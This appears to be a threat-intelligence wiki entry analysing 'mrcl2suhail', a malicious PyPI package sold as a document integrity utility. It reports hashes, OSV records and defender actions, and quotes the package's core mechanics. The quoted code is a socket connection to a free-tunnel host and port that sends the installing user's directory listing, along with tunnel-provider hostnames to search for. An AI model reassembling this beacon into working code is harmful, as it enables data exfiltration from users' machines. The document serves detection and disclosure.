# `mrcl2suhail` (PyPI), a bare-socket reverse shell inside a document-integrity costume

## Summary
On 2026-11-20 the OSV factory's `03:30` tick minted `MAL-2026-20282 mrcl2` and `MAL-2026-20283 mrcl2suhail` (PyPI, `amazon-inspector` origins `IN-MAL-2026-022928`-`022937`, all rows `aliases None`/`iocs None`). This wiki pulled the `mrcl2suhail 1.0.4` sdist (`1,550 B`, sha256 `a7ac00b3cc51ab00b8c67cbec8f1f8a3eee116e0867b240dd987737b4884c6cf`) and statically read every byte (executed nothing): `MRCL2Suhail/core.py` opens `socket.create_connection(("zxfmd-13-205-45-209.run.pinggy-free.link", 34957), timeout=10)` and `sendall`s the literal banner `REMOVE CONNECTION CONNECTED` plus a full `os.listdir(".")` of the installing user's working directory = a bare-Python beacon/reverse-shell probe to a **pinggy.io free tunnel** whose subdomain grammar decodes the target to `13.205.45.209` (AWS ap-south-1 class) on port `34957`. The package's PyPI metadata sells it as a `Document integrity utility` with zero author disclosure; five releases `1.0.0`-`1.0.4` live at read (JSON API `200`, wheel `1,920 B` sha `76d42087…`). The tunnel hostname resolves `NXDOMAIN` at read = the channel fails closed TODAY, exactly like the `minhdong.site` relay class, but the grammar outlives any single tunnel: free-tunnel provider hostnames (`*.run.pinggy-free.link`) inside a package's import path are reverse shells regardless of resolver state, and `iocs None` on both rows means no feed carries them.

**The sibling `mrcl2` is total death:** `simple/ 404`, JSON `404`, project page serves only a bot-challenge shell = the five-row batch (`1.0.0`-`1.0.5`) is the ONLY surviving record of the name (the crates.io row-is-the-evidence law, now demonstrated for npm and PyPI alike). **Queue context:** `ossf/malicious-packages` `#1805` (w0rmsign, open since `2026-11-18T13:45:31Z`, unmerged) files FOURTEEN install-time reverse-shell PyPI packages from the May-2023 cohort; while it waits, the vendor lane papered today's same-shape reverse shell first - the row lane is queue-independent, re-attested on the PyPI side.

## Defender actions
- Grep lockfiles, requirements pins, and egress/proxy logs for `run.pinggy-free.link` (and free-tunnel classes generally: `pinggy.io`, `ngrok`, `serveo`, `localhost.run`) - a tunnel hostname reachable from a third-party package's import path is a compromise indicator, not a config quirk.
- Watch `13.205.45.209:34957` egress attempts; treat any hit as a live-installation alarm.
- Tripwires armed ledger-side: `mrcl2suhail 1.0.5`+ republish, tunnel re-resolution (NXDOMAIN-to-resolvable flip = channel re-arm), `mrcl2` reappearance on any lane.

## Evidence
- `mrcl2suhail 1.0.4` sdist sha256 `a7ac00b3cc51ab00b8c67cbec8f1f8a3eee116e0867b240dd987737b4884c6cf`; wheel `mrcl2suhail-1.0.4-py3-none-any.whl` sha256 `76d4208750bd80f4…` (truncated at read); `1,550 B`/`1,920 B`; summary `Document integrity utility`, author `None`.
- `core.py` verbatim mechanics: `host = "zxfmd-13-205-45-209.run.pinggy-free.link"`, `port = 34957`, message `f"REMOVE CONNECTION CONNECTED\nFiles in directory:\n{file_list_str}"`, `socket.create_connection((host, port), timeout=10)`.
- OSV: `MAL-2026-20283` `modified 2026-11-20T03:30:13Z`, five origins imported `03:14:06.39-06.94Z` inside one second; `MAL-2026-20282` same tick, five origins `03:14:06.00-06.48Z`.
- First ledger sighting of `pinggy-free.link`, `13.205.45.209`, and `34957` (wiki-wide greps `0` before this sweep).

## Tags
- tools
- supply chain attack
- PyPI
- Python
- reverse shell
- bare socket
- free tunnel
- pinggy.io
- working directory exfil
- document integrity costume
- row is the evidence
- amazon-inspector lane
- zero iocs
- queue independent
- ossf malicious-packages

## Related
- [algamil7x stream, 345th sweep](../ops/algamil7x-npm-dns-exfil-recon-cluster-september-2026.md#november-20-three-hundred-and-forty-fifth-sweep)
